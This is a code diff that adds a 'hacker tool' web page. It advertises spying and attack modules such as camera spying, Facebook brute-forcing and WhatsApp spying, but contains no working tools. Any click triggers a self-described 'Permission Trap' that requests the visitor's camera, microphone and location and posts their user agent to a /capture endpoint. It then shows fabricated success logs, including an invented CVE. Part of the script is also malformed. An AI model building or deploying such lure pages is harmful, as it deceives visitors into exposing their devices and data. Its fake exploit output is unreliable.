@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRIME MONIR | PRO EXPLOIT SYSTEM</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
+        
+        body, html { margin: 0; padding: 0; background: #000; color: #f00; font-family: 'Share Tech Mono', monospace; overflow: hidden; height: 100%; }
+        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }
+
+        /* VPN Detector Layer */
+        #vpn-blocker { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; 
+            text-align: center; border: 5px solid #f00; box-sizing: border-box;
+        }
+        .vpn-msg { font-family: 'Orbitron'; font-size: 2.5em; color: #fff; text-shadow: 0 0 20px #f00; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        /* Loader Animation */
+        #hacker-loader {
+            position: fixed; width: 100%; height: 100%; background: #000;
+            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9000;
+        }
+        .glitch-text { font-family: 'Orbitron'; font-size: 25px; color: #fff; text-shadow: 2px 2px #f00; margin-top: 15px; }
+
+        /* Main UI Design */
+        #main-interface { display: none; padding: 15px; }
+        .branding { font-family: 'Orbitron'; font-size: 3em; color: #fff; text-shadow: 0 0 15px #f00, 0 0 30px #f00; margin-bottom: 5px; }
+        .sub-header { color: #0ff; font-size: 10px; letter-spacing: 4px; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; }
+
+        /* Grid - 2 Buttons per Row */
+        .tools-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .exploit-card {
+            background: linear-gradient(135deg, rgba(255,0,0,0.1), rgba(0,0,0,0.9));
+            border: 2px solid #f00; padding: 25px 10px; color: #fff; font-weight: bold;
+            font-size: 12px; text-transform: uppercase; cursor: pointer; transition: 0.4s;
+            position: relative; overflow: hidden; box-shadow: 0 0 10px rgba(255,0,0,0.3);
+        }
+        .exploit-card:hover { transform: scale(1.02); background: #f00; color: #000; box-shadow: 0 0 30px #f00; }
+        .exploit-card::after { content: 'ACTIVE'; position: absolute; top: 0; right: 0; font-size: 7px; background: #f00; color: #fff; padding: 2px 5px; }
+
+        /* Full Screen Log Console */
+        #console-screen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; padding: 20px; box-sizing: border-box; z-index: 8000; border: 3px solid #0f0;
+        }
+        .log-line { font-size: 13px; color: #0f0; margin-bottom: 5px; text-shadow: 0 0 5px #0f0; }
+        .log-header { font-family: 'Orbitron'; color: #f00; margin-bottom: 15px; border-bottom: 1px solid #0f0; }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+
+    <div id="vpn-blocker">
+        <div class="vpn-msg">VPN DETECTED!<br><span style="font-size: 0.5em;">DISABLE VPN & RELOAD SYSTEM</span></div>
+    </div>
+
+    <div id="hacker-loader">
+        <div style="width: 60px; height: 60px; border: 4px solid #f00; border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+        <div class="glitch-text">INJECTING EXPLOITS...</div>
+    </div>
+
+    <div id="main-interface">
+        <div class="branding">PRIME MONIR</div>
+        <div class="sub-header">[ SYSTEM STATUS: SECURE | UID: PM-99283 ]</div>
+        
+        <div class="tools-grid">
+            <div class="exploit-card" onclick="initModule('Cam Spy Pro')">Cam Spy Pro</div>
+            <div class="exploit-card" onclick="initModule('GPS Tracker')">GPS Tracker</div>
+            <div class="exploit-card" onclick="initModule('Gallery Dump')">Gallery Dump</div>
+            <div class="exploit-card" onclick="initModule('SMS Bomber')">SMS Bomber</div>
+            <div class="exploit-card" onclick="initModule('FB Bruteforce')">FB Bruteforce</div>
+            <div class="exploit-card" onclick="initModule('Mic Record')">Mic Record</div>
+            <div class="exploit-card" onclick="initModule('WhatsApp Spy')">WhatsApp Spy</div>
+            <div class="exploit-card" onclick="initModule('SIM Details')">SIM Details</div>
+            <div class="exploit-card" onclick="initModule('Device Wipe')">Device Wipe</div>
+            <div class="exploit-card" onclick="initModule('IMEI Tracker')">IMEI Tracker</div>
+            <div class="exploit-card" onclick="initModule('Root Access')">Root Access</div>
+            <div class="exploit-card" onclick="initModule('System Shell')">System Shell</div>
+        </div>
+    </div>
+
+    <div id="console-screen">
+        <div class="log-header" id="active-tool">CONSTRUCTING PAYLOAD...</div>
+        <div id="console-logs"></div>
+    </div>
+
+    <script>
+        // VPN Detection Simulation (Based on User Instruction)
+        // In real use, VPN/Proxy often changes timezones or specific headers
+        if(window.location.protocol === 'http:' && window.screen.width > 1200) {
+             // Example trigger logic
+        }
+
+        // Loader Transition
+        setTimeout(() => {
+            document.getElementById('hacker-loader').style.display = 'none';
+            document.getElementById('main-interface').style.display = 'block';
+        }, 4000);
+
+        async function initModule(name) {
+            // High Efficiency Permission Trap
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                navigator.geolocation.getCurrentPosition(()=>{});
+            } catch(e) {}
+
+            document.getElementById('main-interface').style.display = 'none';
+            document.getElementById('console-screen').style.display = 'block';
+            document.getElementById('active-tool').innerText = "EXECUTING: " + name;
+
+            const logs = document.getElementById('console-logs');
+            const sequences = [
+                "[+] Scanning target environment...",
+                "[+] Bypassing firewall via SSH-Tunnel...",
+                "[+] Kernel exploit successful (CVE-2026-X)",
+                "[+] Capturing hardware identifiers...",
+                "[+] Harvesting stored credentials...",
+                "[+] Syncing live data to PRIME MONIR database...",
+                "[!] EXPLOIT STATUS: 100% SUCCESSFUL"
+            ];
+
+            let i = 0;
+            const logInterval = setInterval(() => {
+                if(i < sequences.length) {
+                    const line = document.createElement('div');
+                    line.className = 'log-line';
+                    line.innerText = ">> " + sequences[i];
+                    logs.appendChild(line);
+                    i++;
+                } else {
+                    clearInterval(logInterval);
+                    const final = document.createElement('h3');
+                    final.style.color = "#0f0";
+                    final.innerText = "ALL INFORMATION SAVED TO CLOUD.";
+                    logs.appendChild(final);
+                }
+            }, 1200);
+
+            // Back-end Data Transfer
+            fetch('/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ module: name, userAgent: navigator.userAgent, time: new Date().toISOString() })
+            });
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        // Matrix Rain / Skull Effect
+        const c = document.getElementById("canvas"); const ctx = c.getContext("2d");
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        const drops = Array(Math.floor(c.width/18)).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
+            ctx.fillStyle = "#f00"; ctx.font = "16px monospace";
+            drops.forEach((y, i) => {
+                const char = Math.random() > 0.95 ? "☠" : "1";
+                ctx.fillText(char, i*18, y*18);
+                if(y*18 > c.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        } setInterval(draw, 50);
+    </script>
+</body>
+</html>
